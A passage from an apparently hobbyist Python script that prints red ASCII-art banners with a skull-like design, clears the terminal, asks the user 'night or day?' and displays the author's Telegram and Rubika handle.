     QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
      B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
      BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
       B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
       7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
        bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
         gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
          KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
    rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
             QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
              7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                  uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                    :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                       idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                           .rv1XZMQQBBBBBBBQQgZSu7i
    """)

    time.sleep(0.4)

    os.system('clear')

    print(colorama.Fore.RED+"""


                                    # MAX #
                               .7KBQBBBBBBBBBIr                           
                           i5RQQP1ri..   ..i7IbQQM2i                      
                       rQBBDY.                   .JgBBMr                  
                    rBQB7                             vBBBi               
                  PBBr       my id => @CYROSIF       vBQI             
                ZBD.                                       .QBX           
              IBg                                             BBv         
             BB.                                               .BB        
           vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
          DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
         BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
        gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
       YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
       B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
      BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
     .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
     BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
     B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
    jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
    BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
    BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
    BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
    BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
    vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
     B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
     QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
      B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
      BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
       B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
       7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
              bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
         gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
          KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
                           rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
             QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
              7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                  uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                    :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                       idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                           .rv1XZMQQBBBBBBBQQgZSu7i
    """)

    time.sleep(0.4)

    os.system('clear')


    if input(colorama.Fore.RED+'night or day?') in ('night'):

         print(colorama.Fore.GREEN+"nice man good night")
         
    else:

        print(colorama.Fore.RED+"ops good day")

    time.sleep(5)

    os.system('clear')

    print(colorama.Fore.GREEN+" my id telegram vs RUBIKA : @CYROSIF")

    time.sleep(2)


    time.sleep(10)

    os.system('clear')